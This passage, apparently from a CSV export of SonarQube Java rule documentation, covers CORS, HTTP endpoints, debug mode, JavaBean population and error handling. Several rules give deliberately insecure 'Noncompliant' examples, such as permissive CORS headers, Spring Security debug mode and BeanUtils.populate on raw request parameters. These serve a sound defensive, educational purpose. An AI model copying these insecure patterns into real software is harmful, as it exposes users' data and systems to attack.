  resp.setHeader(""Content-Type"", ""text/plain; charset=utf-8"");
  resp.setHeader(""Access-Control-Allow-Origin"", ""http://localhost:8080""); // Questionable
  resp.setHeader(""Access-Control-Allow-Credentials"", ""true""); // Questionable
  resp.setHeader(""Access-Control-Allow-Methods"", ""GET""); // Questionable
  resp.getWriter().write(""response"");
}
</pre>
<pre>
// === Spring MVC Controller annotation ===
@CrossOrigin(origins = ""http://domain1.com"") // Questionable
@RequestMapping("""")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute(""message"", ""ok "");
        return ""view"";
    }

    @CrossOrigin(origins = ""http://domain2.com"") // Questionable
    @RequestMapping(value = ""/test1"")
    public ResponseEntity&lt;String&gt; test1() {
        return ResponseEntity.ok().body(""ok"");
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration"">OWASP Top 10 2017</a> - Category A6 - Security
  Misconfiguration </li>
  <li> <a href=""https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing"">OWASP HTML5 Security Cheat Sheet</a> - Cross
  Origin Resource Sharing </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny"">OWASP CORS OriginHeaderScrutiny</a> </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_RequestPreflighScrutiny"">OWASP CORS RequestPreflighScrutiny</a> </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/346.html"">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/942.html"">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
</ul>",squid:S5122,java,Java,"<p>Enabling Cross-Origin Resource Sharing (CORS) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269"">CVE-2018-0269</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460"">CVE-2017-14460</a> </li>
</ul>
<p>Applications that enable CORS will effectively relax the same-origin policy in browsers, which is in place to prevent AJAX requests to hosts other
than the one showing in the browser address bar. Being too permissive, CORS can potentially allow an attacker to gain access to sensitive
information.</p>
<p>This rule flags code that enables CORS or specifies any HTTP response headers associated with CORS. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Any URLs responding with <code>Access-Control-Allow-Origin: *</code> include sensitive content. </li>
  <li> Any domains specified in <code>Access-Control-Allow-Origin</code> headers are checked against a whitelist. </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only on specific URLs that require access from other domains. Don't enable
  the header on the entire domain. </li>
  <li> Don't rely on the <code>Origin</code> header blindly without validation as it could be spoofed by an attacker. Use a whitelist to check that
  the <code>Origin</code> domain (including protocol) is allowed before returning it back in the <code>Access-Control-Allow-Origin</code> header.
  </li>
  <li> Use <code>Access-Control-Allow-Origin: *</code> only if your application absolutely requires it, for example in the case of an open/public API.
  For such endpoints, make sure that there is no sensitive content or information included in the response. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Java Servlet ===
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
  resp.setHeader(""Content-Type"", ""text/plain; charset=utf-8"");
  resp.setHeader(""Access-Control-Allow-Origin"", ""http://localhost:8080""); // Questionable
  resp.setHeader(""Access-Control-Allow-Credentials"", ""true""); // Questionable
  resp.setHeader(""Access-Control-Allow-Methods"", ""GET""); // Questionable
  resp.getWriter().write(""response"");
}
</pre>
<pre>
// === Spring MVC Controller annotation ===
@CrossOrigin(origins = ""http://domain1.com"") // Questionable
@RequestMapping("""")
public class TestController {
    public String home(ModelMap model) {
        model.addAttribute(""message"", ""ok "");
        return ""view"";
    }

    @CrossOrigin(origins = ""http://domain2.com"") // Questionable
    @RequestMapping(value = ""/test1"")
    public ResponseEntity&lt;String&gt; test1() {
        return ResponseEntity.ok().body(""ok"");
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration"">OWASP Top 10 2017</a> - Category A6 - Security
  Misconfiguration </li>
  <li> <a href=""https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet#Cross_Origin_Resource_Sharing"">OWASP HTML5 Security Cheat Sheet</a> - Cross
  Origin Resource Sharing </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny"">OWASP CORS OriginHeaderScrutiny</a> </li>
  <li> <a href=""https://www.owasp.org/index.php/CORS_RequestPreflighScrutiny"">OWASP CORS RequestPreflighScrutiny</a> </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/346.html"">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/942.html"">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
</ul>",Enabling Cross-Origin Resource Sharing is security-sensitive,[],MINOR,"['cwe', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-28T11:20:07+0100,"<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper
synchronization as callers rely on the thread-safety promised by the parent class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

 @Override
  public foo () {  // Noncompliant
    // ...
    super.foo();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

  @Override
  synchronized foo () {
    // ...
    super.foo();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/XgAZAg"">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are
  not thread-safe </li>
</ul>",squid:S3551,java,Java,"<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper
synchronization as callers rely on the thread-safety promised by the parent class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

 @Override
  public foo () {  // Noncompliant
    // ...
    super.foo();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {

  synchronized void foo() {
    //...
  }
}

public class Child extends Parent {

  @Override
  synchronized foo () {
    // ...
    super.foo();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/XgAZAg"">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are
  not thread-safe </li>
</ul>",Overrides should match their parent class methods in synchronization,[],MAJOR,"['cert', 'multi-threading']",BUG
2018-07-30T14:47:15+0200,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<p>In the case of the Spring framework, methods of a <code>@Controller</code> object annotated with <code>@RequestMapping</code> (or all its variants
such as <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>) are
declaring HTTP endpoints.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping(path = ""/profile"", method = RequestMethod.GET) // Noncompliant
public UserProfile getUserProfile(String name) {
...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",squid:S4529,java,Java,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<p>In the case of the Spring framework, methods of a <code>@Controller</code> object annotated with <code>@RequestMapping</code> (or all its variants
such as <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>) are
declaring HTTP endpoints.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@RequestMapping(path = ""/profile"", method = RequestMethod.GET) // Noncompliant
public UserProfile getUserProfile(String name) {
...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2013-08-30T17:20:57+0200,"<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any
unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and
<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println(""OK"");   // incorrect ""OK"" message is printed
  } catch (RuntimeException e) {
    System.out.println(""ERROR"");  // this message is not shown
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
    return;      // Noncompliant - prevents the RuntimeException from being propagated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println(""OK"");
  } catch (RuntimeException e) {
    System.out.println(""ERROR"");  // ""ERROR"" is printed as expected
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/584.html"">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mIEbAQ"">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>",squid:S1143,java,Java,"<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any
unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and
<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println(""OK"");   // incorrect ""OK"" message is printed
  } catch (RuntimeException e) {
    System.out.println(""ERROR"");  // this message is not shown
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
    return;      // Noncompliant - prevents the RuntimeException from being propagated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println(""OK"");
  } catch (RuntimeException e) {
    System.out.println(""ERROR"");  // ""ERROR"" is printed as expected
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/584.html"">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mIEbAQ"">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>","Jump statements should not occur in ""finally"" blocks",[],CRITICAL,"['cert', 'cwe', 'error-handling']",BUG
2018-06-28T15:02:58+0200,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug
features should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every debug feature is controlled by only very few configuration variables: logging, exception/error handling, access control, etc... It
is otherwise very easy to forget one of them.</p>
<p>Do not enable debug features on production servers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = true) // Noncompliant
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = false) // Compliant
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",squid:S4507,java,Java,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The application should run by default in the most secure mode, i.e. as on production servers. This is to prevent any mistake. Enabling debug
features should be explicitly asked via a command line argument, an environment variable or a configuration file.</p>
<p>Check that every debug feature is controlled by only very few configuration variables: logging, exception/error handling, access control, etc... It
is otherwise very easy to forget one of them.</p>
<p>Do not enable debug features on production servers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = true) // Noncompliant
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = false) // Compliant
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Delivering code in production with debug features activated is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'spring']",SECURITY_HOTSPOT
2018-09-06T11:04:31+0200,"<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114"">CVE-2014-0114</a> </li>
</ul>
<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the
JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute
malicious code.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> BeanUtils.populate(...) or BeanUtilsBean.populate(...) from <a href=""http://commons.apache.org/proper/commons-beanutils/"">Apache Commons
  BeanUtils</a> are called </li>
  <li> BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from <a href=""http://commons.apache.org/proper/commons-beanutils/"">Apache Commons
  BeanUtils</a> are called </li>
  <li> org.springframework.beans.BeanWrapper.setPropertyValue(...) or org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is
  called </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the new property values might have been tampered with or provided by an untrusted source. </li>
  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>
</ul>
<p>You are at risk if you answered yes to any of these question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize all values used as JavaBean properties.</p>
<p>Don't set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,
filter them with a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Company bean = new Company();
HashMap map = new HashMap();
Enumeration names = request.getParameterNames();
while (names.hasMoreElements()) {
    String name = (String) names.nextElement();
    map.put(name, request.getParameterValues(name));
}
BeanUtils.populate(bean, map); // Noncompliant; ""map"" is populated with data coming from user input, here ""request.getParameterNames()""
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/15.html"">MITRE, CWE-15</a> - External Control of System or Configuration Setting </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VwAZAg"">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION"">BEAN_PROPERTY_INJECTION</a> </li>
</ul>",squid:S4512,java,Java,"<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114"">CVE-2014-0114</a> </li>
</ul>
<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the
JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute
malicious code.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> BeanUtils.populate(...) or BeanUtilsBean.populate(...) from <a href=""http://commons.apache.org/proper/commons-beanutils/"">Apache Commons
  BeanUtils</a> are called </li>
  <li> BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from <a href=""http://commons.apache.org/proper/commons-beanutils/"">Apache Commons
  BeanUtils</a> are called </li>
  <li> org.springframework.beans.BeanWrapper.setPropertyValue(...) or org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is
  called </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the new property values might have been tampered with or provided by an untrusted source. </li>
  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>
</ul>
<p>You are at risk if you answered yes to any of these question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize all values used as JavaBean properties.</p>
<p>Don't set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,
filter them with a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Company bean = new Company();
HashMap map = new HashMap();
Enumeration names = request.getParameterNames();
while (names.hasMoreElements()) {
    String name = (String) names.nextElement();
    map.put(name, request.getParameterValues(name));
}
BeanUtils.populate(bean, map); // Noncompliant; ""map"" is populated with data coming from user input, here ""request.getParameterNames()""
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/15.html"">MITRE, CWE-15</a> - External Control of System or Configuration Setting </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VwAZAg"">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION"">BEAN_PROPERTY_INJECTION</a> </li>
</ul>",Setting JavaBean properties is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2013-06-19T07:34:52+0200,"<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way
to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>
<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>
<ul>
  <li> Parameters, using <code>@param parameterName</code>. </li>
  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>
  <li> Method return values, using <code>@return</code>. </li>
  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>
</ul>
<p>Furthermore the following guidelines should be followed:</p>
<ul>
